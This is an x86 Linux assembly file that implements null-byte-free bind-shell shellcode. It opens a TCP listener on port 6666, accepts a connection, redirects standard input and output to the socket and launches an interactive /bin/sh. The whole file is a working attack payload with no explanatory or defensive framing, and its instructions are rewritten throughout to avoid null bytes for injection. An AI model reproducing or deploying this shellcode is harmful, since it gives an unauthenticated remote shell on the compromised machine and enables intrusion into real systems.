.section .text
.global _start

socketcall:
    push %ebp
    mov %esp, %ebp

    push %eax
    push %ebx
    push %ecx

    xor %eax, %eax
    mov $0x66, %al
    mov 8(%ebp), %ebx
    mov 12(%ebp), %ecx
    int $0x80

    # save return value in edx temporarily
    mov %eax, %edx

    pop %ecx
    pop %ebx
    pop %eax

    # set return value
    mov %edx, %eax

    mov %ebp, %esp
    pop %ebp
    ret

_start:
    # socket_param
    sub $12, %esp

    xor %eax, %eax
    add $2, %al
    mov %eax, (%esp)     # replace movl $2, 0(%esp)

    xor %eax, %eax
    add $1, %al
    mov %eax, 4(%esp)    # replace movl $1, 4(%esp)

    xor %eax, %eax
    add $6, %al
    mov %eax, 8(%esp)    # replace movl $6, 8(%esp)

    # soc = socketcall(1, socket_param)
    mov %esp, %eax       # socket_param address
    push %eax

    xor %eax, %eax
    add $1, %al
    push %eax            # replace push $1

    call socketcall

    xor %ecx, %ecx
    add $8, %cl
    add %ecx, %esp       # replace add $8, %esp

    mov %eax, %edi      # save soc in %edi

    xor %ecx, %ecx
    add $12, %cl
    add %ecx, %esp       # replace add $12, %esp (free socket_param)

    # serv_addr
    xor %eax, %eax
    add $16, %al
    sub %eax, %esp       # replace sub $16, %esp

    # 2, 0 (AF_INET)
    xor %eax, %eax
    add $2, %al
    mov %al, (%esp)      # 2
    xor %al, %al
    mov %al, 1(%esp)     # 0

    # htons(6666) = 0x0a1a
    mov $0x1a, %al
    mov %al, 2(%esp)
    mov $0x0a, %al
    mov %al, 3(%esp)

    # 0x00 * 16
    xor %eax, %eax
    mov %eax, 4(%esp)
    mov %eax, 8(%esp)
    mov %eax, 12(%esp)

    # bind_param [soc, &serv_addr, 16]
    xor %eax, %eax
    add $12, %al
    sub %eax, %esp       # replace sub $12, %esp

    mov %edi, (%esp)     # soc

    lea 12(%esp), %eax
    mov %eax, 4(%esp)

    xor %eax, %eax
    add $16, %al
    mov %eax, 8(%esp)

    # socketcall(2, bind_param)
    mov %esp, %eax       # &bind_param
    push %eax

    xor %eax, %eax
    add $2, %al
    push %eax

    call socketcall

    xor %edx, %edx
    add $8, %dl
    add %edx, %esp       # replace add $8, %esp (free socketcall args)

    xor %edx, %edx
    add $12, %dl
    add %edx, %esp       # replace add $12, %esp (free bind_param)

    xor %edx, %edx
    add $16, %dl
    add %edx, %esp       # replace add $16, %esp (free serv_addr)

    # listen_param [soc, 1]
    xor %eax, %eax
    add $8, %al
    sub %eax, %esp       # replace sub $8, %esp

    mov %edi, (%esp)     # soc

    xor %eax, %eax
    add $1, %eax
    mov %eax, 4(%esp)    # replacce movl $1, 4(%esp)

    # socketcall(4, listen_param)
    mov %esp, %eax       # &listen_param
    push %eax

    xor %eax, %eax
    add $4, %al
    push %eax            # replace push $4

    call socketcall

    xor %edx, %edx
    add $8, %dl
    add %edx, %esp       # replace add $8, %esp (free socketcall args)

    xor %edx, %edx
    add $8, %dl
    add %edx, %esp       # replace add $8, %esp (free listen_param)

    # accept_param [soc, NULL, NULL]
    xor %eax, %eax
    add $12, %al
    sub %eax, %esp       # replace sub $12, %esp

    mov %edi, (%esp)     # soc
    xor %eax, %eax
    mov %eax, 4(%esp)    # replace movl $0, 4(%esp)
    mov %eax, 8(%esp)    # replace movl $0, 8(%esp)

    # soc = socketcall(5, accept_param)
    mov %esp, %eax       # &accept_param
    push %eax

    xor %eax, %eax
    add $5, %al
    push %eax            # replace push $5

    call socketcall

    xor %edx, %edx
    add $8, %dl
    add %edx, %esp       # replace add $8, %esp (free socketcall args)

    mov %eax, %edi

    xor %edx, %edx
    add $12, %dl
    add %edx, %esp       # replace add $8, %esp (free accept_param)

    # dup2(soc, 0)
    xor %eax, %eax
    mov $0x3f, %al       # 63
    mov %edi, %ebx       # soc
    xor %ecx, %ecx       # 0
    int $0x80

    # dup2(soc, 1)
    xor %eax, %eax
    mov $0x3f, %al
    mov %edi, %ebx
    xor %ecx, %ecx
    add $1, %ecx         # replace mov $1, %ecx
    int $0x80

    # dup2(soc, 2)
    xor %eax, %eax
    mov $0x3f, %al
    mov %edi, %ebx
    xor %ecx, %ecx
    add $2, %cl          # replace mov $2, %ecx
    int $0x80

    # execve("/bin/sh", ["/bin/sh", "-i", NULL], NULL)
    # "/bin/sh\0"
    xor %eax, %eax
    push %eax            # \0
    push $0x68732f2f     # "//sh"
    push $0x6e69622f     # "/bin"
    mov %esp, %ebx

    # "-i\0"
    xor %eax, %eax
    push %eax
    mov $0x692d, %ax
    push %eax            # replace push $0x692d
    mov %esp, %esi

    # fill argv[]
    xor %eax, %eax
    push %eax            # NULL
    push %esi            # "-i"
    push %ebx            # "/bin/sh"
    mov %esp, %ecx

    # execve
    xor %edx, %edx
    xor %eax, %eax
    mov $0x0b, %al     # 11 (execve syscall)
    int $0x80

    # exit(0)
    xor %eax, %eax
    add $1, %eax           # replace mov $1, %eax
    xor %ebx, %ebx
    int $0x80
